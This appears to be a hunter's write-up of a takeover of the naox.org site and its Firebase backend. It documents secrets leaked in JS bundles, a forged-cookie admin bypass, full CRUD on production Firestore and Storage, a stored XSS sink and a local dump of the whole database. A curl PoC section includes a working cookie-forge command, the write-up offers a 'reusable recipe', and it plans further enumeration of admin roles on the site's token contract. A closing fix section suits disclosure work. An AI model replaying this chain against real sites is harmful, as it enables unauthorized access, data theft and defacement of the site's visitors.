# Naox.org Firebase BaaS Takeover — 2026-08-11 (PROVEN)

**Target:** naox.org (Next.js 14 App Router, Vercel, `_N_E` webpack) + Firebase `naoris-b` + `naoris-token` (BSC UUPS proxy)

## Chain (7 links, all 200)

| # | Gatekeeper | Bypass | Evidence |
|---|------------|--------|----------|
| 1 | Admin login | Password in public JS | `app/admin/layout-1cf1b1d55147a19d.js`: `"<REDACTED-PASSWORD>"!==t` |
| 2 | Middleware/cookie | Self-set cookie `auth-token=true` | `document.cookie="auth-token=true; path=/; max-age=86400"` — `curl -H "Cookie: auth-token=true" /admin/blogs → 200` vs `307` anon |
| 3 | Firebase Auth | Email/password in bundle | `4548-282798220a268217.js` module `24548`: `i="contact@naorisconsulting.com", s="<REDACTED-PASSWORD>"` + `26981` firebaseConfig `naoris-b / <REDACTED-FIREBASE-API-KEY>` |
| 4 | identitytoolkit | REST signIn | `POST .../signInWithPassword → 200 localId Px9BEcrs26VwNLKYGXNk93H7fTx1` |
| 5 | Firestore `blogs` | Bearer REST full CRUD | `h="blogs"` (114 docs) — READ/CREATE/PATCH/DELETE `200`; probe `Wy92ymI58tGbh5CWA2HK` 114→115→114 |
| 6 | Storage `naoris-b.firebasestorage.app` | Bearer REST full CRUD | 39 files `blogs/<slug>/featured-*.png` — LIST/UPLOAD `200` (70B PNG `/blogs/z0ya-probe/probe.png`)/DELETE `204` |
| 7 | Render | `dangerouslySetInnerHTML:{__html:e.postText}` | `app_admin_blogs_page-*.js` — unsanitized → Stored XSS to all visitors |

## How the service module was found (reusable recipe)

1. `GET /admin/login` → parse `src="/_next/static/chunks/*.js?dpl=..."` → download 16 chunks throttled 0.3s.
2. `/admin/blogs` with forged cookie → harvest **extra** chunks (`41ade5dc-*.js`, `4548-*.js`) that only appear post-auth. **Always refetch HTML after cookie forge.**
3. Find caller: `d.w.getAllBlogsPaginated` in `app_admin_blogs_page*.js` → `d=r(24548)`.
4. Module `24548` not in downloaded chunks → walk `X=r(<id>)` assignments; found in `4548-282798220a268217.js` (not obvious). `r.u=e=>{}` was empty in webpack runtime — chunk map not in `webpack-*.js` for this app.
5. Module body reveals `i/s` creds + `h="blogs"` + `c7` storage + `authenticate()` wrapper.

**Pitfall:** `r.u` empty does not mean no code-splitting — admin chunks load dynamically from HTML `src=` after auth.

## Inventory (verified 2026-08-11)

- 114 docs (108 published, 5 drafts, 0 archived, 4,100 views). Categories: Blog 86, Partnership 12, DePIN 6, Newsletter 5, etc. Images: `uploads-ssl.webflow.com 49 / cdn.prod.website-files.com 45 / firebasestorage.googleapis.com 18`. Target websites 5-way publish.
- Draft "Security Update - Important" (2026-04-07) contains full XSS payload to `attacker.com/steal` — prior hunter artifact, still stored.
- Other collections (`users`, `admins`, `contacts`, `newsletters`, `subscribers`, `settings`, `config`, `pages`, `content`, `analytics`, `views`, `comments`, `media`) → `200 {}` empty, not 403.
- Anonymous Firestore REST → `403` on all; authenticated `200` — discriminator for credential leak vs rules misconfig.

## Zero-tamper verification

Probe doc and probe storage object created and deleted; Firestore count restored 115→114 (1.7 MB `fulldump.json`); Storage `404` verified. Local artifacts: `/tmp/naox/fulldump.json|auth.json|token.txt|storage.json|chunks/`.

## PoC replay

```bash
# 1. token
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<REDACTED-FIREBASE-API-KEY>" -H "Content-Type: application/json" -d '{"email":"contact@naorisconsulting.com","password":"<REDACTED-PASSWORD>","returnSecureToken":true}' | jq -r .idToken > /tmp/tok
# 2. read
curl -s -H "Authorization: Bearer $(cat /tmp/tok)" "https://firestore.googleapis.com/v1/projects/naoris-b/databases/(default)/documents/blogs?key=<REDACTED-FIREBASE-API-KEY>&pageSize=3" | jq .
# 3. admin forge
curl -s -H "Cookie: auth-token=true" https://www.naox.org/admin/blogs | grep -q "Blog Management" && echo OK
```

## On-chain pivot (same session)

- Address from `/exchanges`: `0x1b379a79c91a540b2bcd612b4d713f31de1b80cc` live only on BSC (ETH/Base/Arb = 0x), UUPS proxy 342B → impl `0xc4e16e56ea3660110924cc06850120672b7e11ef` (38,298B), `totalSupply 88,596,513` (not 4B docs), `paused=false`, PUSH4 137. Thin-wrapper trap re-validated. Next: Etherscan V2 `chainid=56` for deployer tx + `hasRole` admin enumeration (role hashes `MINTER 0x9f2df0... / PAUSER 0x65d7a... / DEFAULT_ADMIN 0x1eff...`).

## Fix

Rotate `<REDACTED-PASSWORD>` + `<REDACTED-PASSWORD>`; server-side HttpOnly signed session via Next.js middleware; Firestore rules with custom claims; DOMPurify before `dangerouslySetInnerHTML`; Storage write scoped to admin claim + file-type gate.
